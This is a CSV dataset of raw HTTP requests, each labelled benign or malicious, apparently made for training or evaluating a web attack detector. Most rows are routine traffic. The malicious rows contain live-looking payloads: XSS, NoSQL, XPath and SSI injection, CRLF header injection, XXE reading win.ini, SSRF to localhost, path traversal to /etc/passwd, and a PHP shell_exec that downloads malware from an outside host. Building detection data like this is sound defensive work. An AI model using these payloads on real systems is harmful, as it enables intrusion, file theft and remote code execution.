label,text
benign,"GET /fonts/noto-sans-regular.woff2 HTTP/1.1
Host: multilingualcontent.info
Connection: keep-alive
Accept: font/woff2,application/font-woff2;q=0.9
Referer: https://multilingualcontent.info/css/noto-sans.css
Origin: https://multilingualcontent.info
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36"
benign,"POST /user/preferences/update HTTP/1.1
Host: wellness-community.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Accept: text/html,application/xhtml+xml
Origin: https://wellness-community.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive

notifications=email&notifications=sms&theme=dark"
malicious,"GET /profile/view?user=%26lt%3Bscript%26gt%3Balert%28%26%2339%3BXSS_%20Vulnerability_Found%26%2339%3B%29%26lt%3B%2Fscript%26gt%3B HTTP/1.1
Host: my-personal-blog-site.info
Connection: close
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.8
Referer: https://my-personal-blog-site.info/home
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
benign,"PUT /data/clients/78342/profile HTTP/1.1
Host: client-data-services.net
Content-Type: application/json
Accept: application/json
Origin: https://portal.client-data-services.net
X-Requested-With: XMLHttpRequest
Authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Connection: close

{""profile"":{""firstName"":""Lucia"",""lastName"":""Martínez"",""email"":""lucia.martinez@examplemail.org""}}"
benign,"POST /sessions/login HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 105
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Mobile Safari/537.36
Referer: https://secure-user-portal.net/signin
Connection: close

username=markjohnson&password=securepass123&csrf_token=b1886fca85902763&form_id=loginForm&timestamp=1685610129&return_url=%2Fhome"
benign,"GET /gallery/summer2024/highlights HTTP/1.1
Host: photo-archive-collection.org:5001
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.8
Referer: https://photo-archive-collection.org/home
Connection: keep-alive"
malicious,"GET /api/users/lookup?identifier=charlie&pass%5B%24ne%5D=test123 HTTP/1.1
Host: cloud-user-db.services.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: */*
Referer: https://cloud-user-db.services.org/login
Connection: keep-alive"
benign,"GET /img/campaign/landing/hero-background_2400x900.png HTTP/1.1
Host: marketing-cloud-buzz.net
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://marketing-cloud-buzz.net/campaigns/summer-hits
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Connection: keep-alive"
benign,"POST /user/profile/comments HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Accept-Language: en-GB,en;q=0.5
Cache-Control: no-cache
Cookie: sessionid=FxTm10DjZ2bP9n3kJxQ4hC8RamUl5NqM
Connection: keep-alive

userID=61829&comments=VGhlIGZlZWF0dXJlcyBvZiB0aGUgc291cmNlIGFyZSB3ZWxsIGNhcmVmdWFsbHkgb3ZlcndoZWw=."
benign,"GET /api/v5/books/library/9780316499019 HTTP/1.1
Host: global-library-api.educationhub.org
Accept: application/json
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept-Encoding: gzip
Via: 1.1 vegur
Connection: keep-alive"
benign,"GET /community/forums/thread/3921?token=eyJraWQiOiJrZXlfMTIzNDU2IiwieDV0IjoiQkFTRTY0X0VYQU1QTEUiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiZ2FtZXJfdXNlcl9ubG9uZyIsImV4cCI6MTY5MjAxNzQwMH0.C-sHUrMWPdsXuai1wVscXhdpRv_0mUH_S43__(cLiGYuKZ0O1FGr78RWTFP7KbRBaP4-j8AP9Flnx0a1_Q1FuWw5MgF0EvzCPe0zqMviaWiV8pQycG4ToselVtOhErCFGMAn1h29Zdx-Q0s4xJQkOwXLZdINm_z72hvVe5NhpZQ HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html,application/xhtml+xml
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9"
benign,"GET /search/media?keywords=nature,travel,photography&filter=recent,highres&category=photos&license=creative-commons&page=1&per_page=100&sort=relevance&uploader=natasha_lynn&region=na&format=jpeg&aspect_ratio=landscape HTTP/1.1
Host: visualmedia-explorer.net
Connection: keep-alive
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Referer: https://visualmedia-explorer.net/gallery"
benign,"POST /submit_vote HTTP/1.1
Host: online-opinions-platform.net
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15
Connection: close
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
DNT: 1

poll_id=204&vote_option=B"
benign,"POST /media/uploads HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.136 Mobile Safari/537.36
Accept: */*
Content-Type: multipart/form-data; boundary=----UploadBoundary89aMnp
Referer: https://online-retail-store.biz/products/new
Content-Length: 6204
Connection: keep-alive
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

------UploadBoundary89aMnp
Content-Disposition: form-data; name=""product_images[]""; filename=""front_view.jpeg""
Content-Type: image/jpeg

<binary image data>
------UploadBoundary89aMnp
Content-Disposition: form-data; name=""product_images[]""; filename=""side_view.png""
Content-Type: image/png

<binary image data>
------UploadBoundary89aMnp
Content-Disposition: form-data; name=""product_images[]""; filename=""box_contents.jpeg""
Content-Type: image/jpeg

<binary image data>
------UploadBoundary89aMnp--"
malicious,"GET /app/user/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36%0d%0aX-Evil-Header:%20InjectedValue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
benign,"GET /news/latest-updates HTTP/1.1
Host: daily-trendz.media
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Referer: https://daily-trendz.media/
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1"
benign,"GET /static/css/main-style.css HTTP/1.1
Host: modern-web-experience.net
Connection: keep-alive
Accept: text/css,*/*;q=0.1
Referer: https://modern-web-experience.net/home
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9"
malicious,"POST /profile/update HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://community.game-dev-forum.org
Content-Length: 66

bio=New%20gamer%20profile%20info%20%3C!--#inCLude%20FiLe%3D%22/etc/issue%22%20--%3E"
benign,"GET /api/v1/user/profile HTTP/1.1
Host: example.com:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-GB,en;q=0.9
Referer: https://example.com:8080/login
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Connection: close"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: secure-user-portal.net
Connection: close
Accept: */*
Cache-Control: no-cache
Pragma: no-cache
DNT: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15
Accept-Language: en-gb,en;q=0.8"
benign,"POST /api/contact/send HTTP/1.1
Host: urbanstyle-fashions.jp
Content-Type: application/xml
Content-Length: 137
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept: application/xml, text/html
Referer: https://urbanstyle-fashions.jp/contact

<contactRequest>
  <name>Haruki Tanaka</name>
  <email>haruki.t@urbanstyle-fashions.jp</email>
  <subject>Store locations inquiry</subject>
  <message>Could you please provide your store locations in Tokyo?</message>
</contactRequest>"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: community.graphic-designers.space
Pragma: no-cache
Cache-Control: no-cache
Accept: image/png,image/*,*/*;q=0.8
User-Agent: curl/7.85.0"
benign,"GET /atom.xml HTTP/1.1
Host: travel-logs-journal.io
Accept: application/atom+xml
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Referer: https://travel-logs-journal.io/stories/europe-2023
DNT: 1
Connection: keep-alive"
benign,"POST /api/orders HTTP/1.1
Host: freshmarket-delivery.biz
Authorization: Bearer dXNlcjpkYXlzNjEgZXhhbXBsZXRva2Vu
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Connection: close
Referer: https://freshmarket-delivery.biz/checkout
Accept-Language: en-US,en;q=0.5

{
  ""customerId"": 3322,
  ""items"": [
    {""productId"": ""FRT-745"", ""quantity"": 4},
    {""productId"": ""VGT-211"", ""quantity"": 2},
    {""productId"": ""DRK-103"", ""quantity"": 1}
  ],
  ""deliveryAddress"": {
    ""street"": ""2187 Mulberry St"",
    ""city"": ""Lakewood"",
    ""state"": ""NJ"",
    ""zip"": ""08701""
  },
  ""paymentMethod"": ""credit_card"",
  ""notes"": ""Leave package at the back door.""
}"
benign,"POST /js/plugins/chat-widget.js HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/javascript
Content-Length: 42
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1
Accept-Language: en-us
Connection: keep-alive

console.log('Chat widget ready for interaction');"
benign,"POST /api/v4/user/profile/update HTTP/1.1
Host: user-hub.gateway-network.biz
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjI4OTQ2NSJ9.k-L_mHcbnGL0m0zFVWDTGJGTrxmJO1DBLDMosS1iqoM
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Connection: close
Content-Length: 427

{
  ""userId"": ""289465"",
  ""profile"": {
    ""name"": {
      ""first"": ""Miranda"",
      ""last"": ""Chen""
    },
    ""contact"": {
      ""email"": ""miranda.chen@examplemail.biz"",
      ""phones"": [
        {""type"": ""mobile"", ""number"": ""+15552345678""},
        {""type"": ""home"", ""number"": ""+15558765432""}
      ]
    },
    ""interests"": [""photography"", ""hiking"", ""gardening""],
    ""social"": {
      ""twitter"": ""@mirandachen"",
      ""linkedin"": ""miranda-chen-648392""
    }
  }
}"
benign,"PUT /settings/privacy HTTP/1.1
Host: my-personal-blog-site.info
If-Match: ""2d4a55f33b9c7a10""
Content-Type: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9
Content-Length: 54
Connection: keep-alive

{""showEmail"":false,""allowComments"":true,""adPersonalization"":false}"
benign,"GET /api/v4/items/search?category=books&sort=popularity HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/json
Accept-Encoding: gzip, deflate
X-Forwarded-For: 52.174.33.45
Connection: close"
benign,"POST /feedback/submit HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Referer: https://my-personal-blog-site.info/post/how-to-start-gardening
Content-Length: 70
Connection: keep-alive

name=James+Keller&email=james.keller@emaildomain.net&comments=Great+article,+thanks!"
benign,"GET /v2/financials/summary HTTP/1.1
Host: finance.api-global-assets.net
X-Api-Token: 2fe1e69c4a6847dfb5c8b3ff6a12e458
Accept: application/json
Referer: https://dashboard.api-global-assets.net/home
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Connection: keep-alive"
benign,"GET /dashboard/overview?cmd=status_check HTTP/1.1
Host: account-analytics-cloud.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"OPTIONS /api/v1/blog-posts/48572/delete HTTP/1.1
Host: write-and-share-blog.info
Origin: https://editor.make-content.org
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept-Encoding: gzip, deflate
DNT: 1"
malicious,"GET /catalog/query?product_code=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
Host: nexus-electro-stock.biz
User-Agent: Wget/1.20
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
Connection: close"
malicious,"POST /app/contact/send-message HTTP/1.1
Host: contact-support-haven.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Cache-Control: no-cache
Content-Length: 128

email=alice%40mailservice.info&message=Thank+you+for+the+help%21+%3C%3Fphp+echo+shell_exec%28%27wget+http%3A%2F%2Fexploiters-zone.biz%2Fmalware.php+-O+%2Ftmp%2Fbad.php%27%29%3B+%3F%3E"
malicious,"POST /v2/logs/submit HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/json
Cache-Control: no-cache
Accept-Language: en-US,en;q=0.9
Content-Length: 209

{
  ""device"": ""sensor-42"",
  ""event_details"": ""Temperature reading normal\"", \""threshold_exceeded\"": false, \""alert_sent\"": false, \""original_event\"": \"""",
  ""timestamp"": ""2024-06-15T13:45:30Z""
}"
benign,"GET /search/v2/resources?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: devtools.tech-resources.io
User-Agent: python-requests/2.28.1
Accept: application/json
Accept-Language: en-US,en;q=0.9
X-Forwarded-For: 203.0.113.56
Connection: keep-alive"
malicious,"POST /upload/processDocument HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/xml,application/xhtml+xml,text/html;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Origin: https://api.cloud-data-services.ai
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----BoundaryXYZ123
Content-Length: 472
Connection: close

------BoundaryXYZ123
Content-Disposition: form-data; name=""description""

Monthly system import
------BoundaryXYZ123
Content-Disposition: form-data; name=""file""; filename=""settings.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------BoundaryXYZ123--"
benign,"POST /user/uploads/photos HTTP/1.1
Host: gallery-cloudstorage.io
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Accept: image/webp,image/apng,image/*,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Origin: https://gallery-cloudstorage.io
Referer: https://gallery-cloudstorage.io/user/uploads
Content-Length: 681

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""files[]""; filename=""vacation2023.png""
Content-Type: image/png

<PNG FILE DATA - omitted>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""files[]""; filename=""family_photo.jpg""
Content-Type: image/jpeg

<JPEG FILE DATA - omitted>
------WebKitFormBoundary7MA4YWxkTrZu0gW--"
benign,"PATCH /api/accounts/42098/preferences HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer XYZ195uN75LLOpk134jwOD2c
Content-Type: application/merge-patch+json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Content-Length: 29
Connection: keep-alive

{""emailNotifications"":false,""theme"":""dark""}"
benign,"DELETE /api/v1/employees/4592 HTTP/1.1
Host: hr-management.my-personal-blog-site.info
Authorization: Bearer d3adbeefcafebabe8945f87ac2e8a519
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: application/json
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"OPTIONS /api/v2/analytics/views/55897/settings HTTP/1.1
Host: analytics-platform-cloud.biz
Origin: https://reports-dashboard.enterprise.net
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header, x-api-key
User-Agent: Python-urllib/3.11
Accept-Encoding: identity
Connection: keep-alive"
benign,"POST /submit-media/document HTTP/1.1
Host: local-media-uploaders.community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: multipart/form-data; boundary=--FGH89Z
Content-Length: 345
Referer: https://community.game-dev-forum.org/upload
Cookie: forum_session=6a9cbd33d22ffe1a000e0c7d1234bfc2; user_pref=dark_mode

--FGH89Z
Content-Disposition: form-data; name=""document""; filename=""game_design_doc_final.pdf""
Content-Type: application/pdf

%PDF-1.3
% Game design document placeholder
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
--FGH89Z
Content-Disposition: form-data; name=""game_title""

Nebula Raider
--FGH89Z
Content-Disposition: form-data; name=""version""

1.2.0
--FGH89Z--"
benign,"OPTIONS /v2/data/submit HTTP/1.1
Host: api.cloud-data-services.ai
Origin: https://admin.enterprise-analytics.biz
Access-Control-Request-Method: POST
Access-Control-Request-Headers: authorization, content-type
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: */*
Connection: close"
malicious,"PUT /user/avatar/update HTTP/1.1
Host: avatar-upload-service.io
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/json
Accept-Charset: utf-8, iso-8859-1;q=0.5
Content-Type: application/json
Content-Length: 68
Origin: https://profile.avatar-upload-service.io
Cache-Control: no-cache
Pragma: no-cache

{""avatarSource"":""http://0x7f.0x0.0x0.0x1:8080/status?check=avatar""}"
benign,"OPTIONS /api/v1/library/books/17789/metadata HTTP/1.1
Host: book-management-service.net
Origin: https://digital-library.admin-site.org
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header, x-api-key
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
benign,"GET /user/details?id=17 HTTP/1.1
Host: secure-user-portal.net
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Referer: https://secure-user-portal.net/dashboard
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Accept-Language: en-US,en;q=0.5"
benign,"POST /members/profile/edit HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 132
Connection: keep-alive
Accept-Language: en-US,en;q=0.9
Referer: https://community.game-dev-forum.org/members/profile
Origin: https://community.game-dev-forum.org
Cookie: sid=3f5b3c2d9874f0db7ff9caf53968a319; HttpOnly; Secure
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0

display_name=Aria+Khan&bio=Indie+game+developer+and+pixel+artist.+Loves+retro+aesthetics.&website_url=https%3A%2F%2Fkhanaria.games&location=Berlin%2C+Germany"
malicious,"POST /query/userinfo HTTP/1.1
Host: financial-service-network.io
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/json
Accept: application/json
Cache-Control: max-age=0
Content-Length: 131

{""query"": ""/users/user[username='admin' and substring(password,6,1)='w']/account/id""}"
malicious,"GET /file/view?template=..%c0%ae%c0%af..%c0%ae%c0%af..%c0%ae%c0%afetc%c0%afpasswd HTTP/1.1
Host: assets.secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://dashboard.secure-user-portal.net/app/home
Cache-Control: no-cache"
benign,"GET /search/results?search=SELECT%20best%20option%20FROM%20list HTTP/1.1
Host: inquiry-data-hub.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://inquiry-data-hub.net/"
malicious,"POST /profile/edit HTTP/1.1
Host: media-streaming-alpha.tv
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Content-Length: 71
Cache-Control: max-age=0

bio=I%20love%20movies';db.profiles.update({user:'admin'},{$set:{access:'full'}}); //&location=NYC"
benign,"GET /api/v1/media?type=video&duration_short=true&quality=hd HTTP/1.1
Host: stream-center-videos.hosting-cloud.info
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Authorization: Bearer 9a3c1cf7e6614ab7b568dc45d2b3bedc
Connection: keep-alive"
malicious,"PATCH /api/custom_data/store HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Content-Length: 298
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Origin: https://secure-user-portal.net
X-Requested-With: FetchAPIClient
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9

{""user"": ""johndoe94"", ""settings"": {""theme"": ""dark"", ""notifications"": true}, ""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""active_flag"", ""lastLogin"": ""2024-05-28T15:42:18Z""}"
